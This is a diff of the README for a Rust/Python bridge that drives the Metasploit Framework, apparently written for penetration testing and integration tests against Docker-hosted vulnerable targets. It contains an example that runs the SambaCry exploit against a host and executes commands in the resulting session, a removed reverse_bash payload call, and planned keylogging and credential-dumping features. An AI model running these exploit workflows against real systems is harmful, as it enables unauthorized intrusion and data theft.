@@ -20,11 +20,12 @@
 
 ### Key Features
 
-- **Complete MSF Access**: Full Python API (Framework, Modules, Sessions, Payloads, Database, Jobs, Plugins)
-- **High Performance**: MessagePack over lock-free shared memory (5-10x faster than JSON)
-- **Async/Sync APIs**: Both `async/await` and synchronous interfaces
-- **Production Ready**: 118 integration tests, comprehensive CI/CD across 6 Linux distributions
-- **Multi-Platform**: Validated on Debian, Kali, Parrot, Ubuntu, Fedora, and Arch Linux
+- **Complete MSF Access**: 173 Rust methods, 152 Python async methods covering Framework, Modules, Sessions, Meterpreter, Payloads, Database, Jobs, and Plugins
+- **Full Session Control**: Shell sessions, Meterpreter with filesystem/process/network ops, client core (migrate, extensions), transport management
+- **High Performance**: MessagePack over lock-free shared memory ring buffers (5-10x faster than JSON-RPC)
+- **Async Python API**: Modern `async/await` interface with type hints
+- **Production Ready**: Comprehensive CI/CD across 6 Linux distributions
+- **Docker Testing**: Vulnerable targets (vsftpd, SambaCry, Rejetto HFS) for integration testing
 
 ---
 
@@ -100,22 +101,24 @@ assassinate/
 │       │   └── main.rs      # Daemon server
 │       └── Cargo.toml
 │
-├── tests/                   # Integration tests (118 tests)
-│   ├── conftest.py          # Pytest fixtures
-│   ├── test_framework_detailed.py
-│   ├── test_module_detailed.py
-│   ├── test_datastore.py
-│   ├── test_payloads.py
-│   ├── test_db.py
-│   ├── test_jobs.py
-│   ├── test_plugins.py
-│   └── test_sessions.py
+├── python/                  # Python package and tests
+│   ├── assassinate/         # Main Python package
+│   │   ├── ipc/             # IPC client implementation
+│   │   │   └── client.py    # Async IPC client (152 methods)
+│   │   └── ...
+│   └── tests/               # Integration tests
+│       ├── conftest.py      # Pytest fixtures (session fixtures, etc.)
+│       ├── test_integration_sessions.py  # Shell session tests
+│       ├── test_samba_exploit.py         # SambaCry (CVE-2017-7494) tests
+│       ├── test_meterpreter_*.py         # Meterpreter session tests
+│       ├── test_db*.py                   # Database tests
+│       └── ...
 │
 ├── .github/workflows/       # CI/CD pipelines
 │   ├── ci.yml              # Main CI (Rust + Python tests)
 │   └── distro-matrix.yml   # Multi-distro validation
 │
-├── TESTING_GUIDE.md        # Complete testing documentation
+├── docker/                  # Docker infrastructure (dev + prod)
 ├── pyproject.toml          # Python project config
 └── README.md               # This file
 ```
@@ -292,61 +295,63 @@ sessions = fw.sessions()
 session_ids = sessions.list()
 ```
 
-### Async API
+### Async API (Recommended)
 
 ```python
-from assassinate.ipc import AsyncIPCClient
+from assassinate.ipc.client import MsfClient
 import asyncio
 
 async def main():
-    async with AsyncIPCClient() as client:
+    async with MsfClient() as client:
         # Get MSF version
-        version = await client.framework_version()
+        version = await client.version()
         print(f"MSF Version: {version}")
 
-        # Create module
-        mod_result = await client.framework_create_module("exploit/unix/ftp/vsftpd_234_backdoor")
-        
-        # Configure module
-        await client.module_set_option({"key": "RHOSTS", "value": "192.168.1.100"})
-        
-        # Generate payload
-        payload = await client.payloads_generate_raw(
-            "cmd/unix/reverse_bash",
-            {"LHOST": "192.168.1.5", "LPORT": "4444"}
-        )
+        # Create and configure an exploit module
+        module_id = await client.create_module("exploit/linux/samba/is_known_pipename")
+        await client.module_set_option(module_id, "RHOSTS", "192.168.1.100")
+        await client.module_set_option(module_id, "SMB_SHARE_NAME", "myshare")
+
+        # Run exploit and get session
+        session_id = await client.module_exploit(module_id, "cmd/unix/interact")
+
+        if session_id:
+            # Execute commands on compromised host
+            output = await client.session_run_cmd(session_id, "id")
+            print(f"Running as: {output}")
+
+            # Filesystem operations (Meterpreter)
+            files = await client.session_fs_ls(session_id, "/etc")
+
+            # Clean up
+            await client.session_kill(session_id)
+
+        await client.delete_module(module_id)
 
 asyncio.run(main())
 ```
 
 ### API Reference
 
-**IPC Client Methods:**
+**MsfClient Methods (152 async methods):**
 
-All methods support both sync and async operation via `AsyncIPCClient`:
+| Category | Key Methods |
+|----------|-------------|
+| **Framework** | `version()`, `list_modules()`, `create_module()`, `search()`, `reload_modules()`, `save()` |
+| **Modules** | `module_set_option()`, `module_get_option()`, `module_validate()`, `module_exploit()`, `module_run()`, `module_check()` |
+| **Sessions** | `sessions_list()`, `session_info()`, `session_kill()`, `session_run_cmd()`, `session_shell_read()`, `session_shell_write()` |
+| **Session FS** | `session_fs_pwd()`, `session_fs_ls()`, `session_fs_cd()`, `session_fs_download()`, `session_fs_upload()`, `session_fs_stat()` |
+| **Session Sys** | `session_sys_info()`, `session_sys_getuid()`, `session_sys_getpid()`, `session_sys_ps()`, `session_sys_kill()` |
+| **Session Net** | `session_net_interfaces()`, `session_net_routes()`, `session_net_arp()`, `session_net_netstat()` |
+| **Meterpreter Core** | `session_core_migrate()`, `session_core_use()`, `session_core_shutdown()`, `session_core_machine_id()` |
+| **Transport** | `session_transport_list()`, `session_transport_add()`, `session_transport_change()`, `session_transport_remove()` |
+| **Payloads** | `payload_generate()`, `payload_generate_encoded()`, `payload_generate_executable()`, `payload_list()` |
+| **Database** | `db_report_host()`, `db_report_service()`, `db_report_vuln()`, `db_hosts()`, `db_services()` |
+| **DB Workspace** | `db_workspaces()`, `db_workspace()`, `db_set_workspace()`, `db_add_workspace()`, `db_delete_workspace()` |
+| **Jobs** | `job_list()`, `job_info()`, `job_kill()` |
+| **Plugins** | `plugin_list()`, `plugin_load()`, `plugin_unload()` |
 
-- **Framework**: `framework_version()`, `framework_list_modules()`, `framework_create_module()`, `framework_search()`
-- **Modules**: `module_set_option()`, `module_get_option()`, `module_validate()`, `module_check()`
-- **Payloads**: `payloads_generate_raw()`, `payloads_generate_exe()`, `payloads_encode()`
-- **Sessions**: `sessions_list()`, `sessions_get()`, `sessions_stop()`, `sessions_execute()`
-- **Database**: `db_report_host()`, `db_report_service()`, `db_report_vuln()`, `db_report_cred()`
-- **Jobs**: `jobs_list()`, `jobs_get()`, `jobs_kill()`
-- **Plugins**: `plugins_list()`, `plugins_load()`, `plugins_unload()`
-- **DataStore**: `datastore_get()`, `datastore_set()`, `datastore_delete()`
-
-**High-Level Python API:**
-
-The `assassinate.bridge` package provides a high-level, Pythonic wrapper:
-
-```python
-from assassinate.bridge import Framework
-
-fw = Framework()
-exploits = fw.list_modules("exploit")
-mod = fw.create_module("exploit/...")
-```
-
-See API documentation in code docstrings.
+See full API in `python/assassinate/ipc/client.py` with comprehensive docstrings and type hints.
 
 ---
 
@@ -451,7 +456,7 @@ uv run pytest tests/
 
 ## ✅ Testing
 
-### Test Suite (118 Tests)
+### Test Suite
 
 ```bash
 # Run all tests
@@ -464,17 +469,43 @@ uv run pytest tests/test_framework_detailed.py -v
 ASSASSINATE_LOG_LEVEL=DEBUG uv run pytest tests/ -v
 ```
 
-### Docker Testing
+### Docker Testing Infrastructure
+
+The project includes a comprehensive Docker testing environment with vulnerable targets:
+
+**Available Services:**
+
+| Service | Description | Vulnerabilities |
+|---------|-------------|-----------------|
+| `target-linux` | Debian-based vulnerable container | vsftpd 2.3.4 (CVE-2011-2523), Samba 4.6.3 (CVE-2017-7494) |
+| `target-windows` | Windows Server 2008 R2 (KVM) | Rejetto HFS 2.3 (CVE-2014-6287) |
+| `postgres` | PostgreSQL database | MSF data persistence |
+| `dev` | Development container | Full MSF + build tools |
+| `integration-test` | Test runner container | Automated testing |
+
+**Running Integration Tests:**
 
 ```bash
-# Run tests in Docker (clean environment)
-./scripts/test-with-docker.sh
+# Start Docker environment
+docker compose -f docker/docker-compose.yml up -d postgres target-linux
 
-# Rebuild from scratch
-./scripts/test-with-docker.sh --rebuild
+# Run integration tests
+docker compose -f docker/docker-compose.yml run --rm integration-test bash -c \
+  "cargo build --release --manifest-path rust/daemon/Cargo.toml && \
+   pytest python/tests/ -v"
 
-# Verbose output
-./scripts/test-with-docker.sh --verbose
+# Run specific test file
+docker exec dev pytest python/tests/test_samba_exploit.py -v
+```
+
+**Windows Target (requires KVM):**
+
+```bash
+# Start Windows target (first run downloads/installs Windows ~10-20 min)
+docker compose -f docker/docker-compose.yml up -d target-windows
+
+# Access via web VNC for debugging
+# http://localhost:8006
 ```
 
 ### Local CI Validation
@@ -484,7 +515,7 @@ ASSASSINATE_LOG_LEVEL=DEBUG uv run pytest tests/ -v
 ./.github/scripts/test-ci-locally.sh
 ```
 
-See [TESTING_GUIDE.md](TESTING_GUIDE.md) for comprehensive testing documentation.
+See [docker/README.md](docker/README.md) for comprehensive testing documentation and [setup/DISTRO_NOTES.md](setup/DISTRO_NOTES.md) for distribution-specific notes.
 
 ---
 
@@ -555,27 +586,90 @@ This project is licensed under the **GNU General Public License v3.0 (GPL-3.0)**
 
 - **Issues**: [GitHub Issues](https://github.com/ausmaster/assassinate/issues)
 - **Discord**: [Join our community](https://discord.com/invite/PZqkgxu5SA)
-- **Documentation**: See [TESTING_GUIDE.md](TESTING_GUIDE.md)
+- **Documentation**: See [docker/README.md](docker/README.md) and [setup/DISTRO_NOTES.md](setup/DISTRO_NOTES.md)
 
 ---
 
 ## 🎯 Status & Roadmap
 
-**Completed:**
-- ✅ Complete Python IPC interface (async/sync)
-- ✅ Comprehensive CI/CD across 6 Linux distributions
-- ✅ 118 integration tests with full MSF validation
-- ✅ Docker testing environment
-- ✅ Structured logging (Python + Rust)
-- ✅ MessagePack protocol (5-10x faster than JSON)
-- ✅ Lock-free shared memory ring buffers
+### API Coverage
 
-**Planned:**
-- [ ] BBOT integration module
-- [ ] Performance benchmarking suite
-- [ ] Extended platform support (macOS, Windows)
-- [ ] API documentation site
+| Category | Rust Bridge | Daemon | Python | Status |
+|----------|-------------|--------|--------|--------|
+| Framework API | 17 | 9 | 9 | ✅ Complete |
+| Module API | 31 | 29 | 21 | ✅ Complete |
+| DataStore | 7 | 8 | 8 | ✅ Complete |
+| Payload Generation | 6 | 4 | 4 | ✅ Complete |
+| Session Core | 18 | 18 | 17 | ✅ Complete |
+| Session Filesystem | 14 | 14 | 14 | ✅ Complete |
+| Session Process | 4 | 4 | 4 | ✅ Complete |
+| Session System | 9 | 9 | 9 | ✅ Complete |
+| Session Network | 7 | 7 | 7 | ✅ Complete |
+| Session Shell | 3 | 3 | 3 | ✅ Complete |
+| Meterpreter Client Core | 7 | 7 | 7 | ✅ Complete |
+| Transport Management | 8 | 8 | 8 | ✅ Complete |
+| Database Basic | 10 | 9 | 9 | ✅ Complete |
+| Database Workspace | 6 | 6 | 6 | ✅ Complete |
+| Database Notes | 3 | 3 | 3 | ✅ Complete |
+| Database Status | 2 | 2 | 2 | ✅ Complete |
+| Jobs | 4 | 3 | 3 | ✅ Complete |
+| Plugins | 4 | 3 | 3 | ✅ Complete |
+| **Totals** | **173** | **145** | **152** | |
+
+### Completed Features
+
+**Core Framework:**
+- ✅ Complete Python IPC interface (async/sync) - 152 async methods
+- ✅ Module operations (create, configure, exploit, run, check, validate)
+- ✅ Full session management (shell and Meterpreter)
+- ✅ Meterpreter Client Core (migrate, use extension, shutdown, machine_id, native_arch, session_guid, secure)
+- ✅ Transport Management (list, add, change, remove, sleep, next/prev, timeouts)
+- ✅ Payload generation (raw, encoded, executable)
+- ✅ Database CRUD with workspace and notes management
+- ✅ Job and plugin management
+
+**Infrastructure:**
+- ✅ Lock-free shared memory ring buffers (SPSC)
+- ✅ MessagePack protocol (5-10x faster than JSON)
+- ✅ Structured logging (Python + Rust)
+- ✅ Comprehensive CI/CD across 6 Linux distributions
+- ✅ Docker testing environment with vulnerable targets
+
+**Testing:**
+- ✅ Integration tests with Docker targets
+- ✅ Linux target: vsftpd 2.3.4 (CVE-2011-2523), SambaCry (CVE-2017-7494)
+- ✅ Windows target: Rejetto HFS 2.3 (CVE-2014-6287)
+- ✅ Session fixtures for shell and Meterpreter testing
+
+### Planned Features
+
+**Priority 1 - Routing & Pivoting:**
+- [ ] Route management (add, remove, list, autoroute)
+- [ ] Port forwarding (local and reverse)
+- [ ] SOCKS proxy support
+
+**Priority 2 - Handler Management:**
+- [ ] Payload handler creation and lifecycle
+- [ ] Handler types: reverse_tcp, reverse_http(s), bind_tcp
+
+**Priority 3 - Meterpreter Extensions:**
+- [ ] UI extension (screenshot, keylogger, idle_time)
+- [ ] Webcam extension
+- [ ] Registry extension (Windows)
+- [ ] Priv extension (getsystem, SAM hashes)
+- [ ] Incognito extension (token impersonation)
+
+**Priority 4 - Database Advanced:**
+- [ ] Full CRUD for hosts, services, vulns, creds
+- [ ] Loot and event management
+- [ ] Session database tracking
+- [ ] Import/export (25+ formats)
+
+**Priority 5 - Extended Platform Support:**
+- [ ] macOS support
+- [ ] Windows native support
 - [ ] PyPI package publication
+- [ ] API documentation site
 
 ---
 
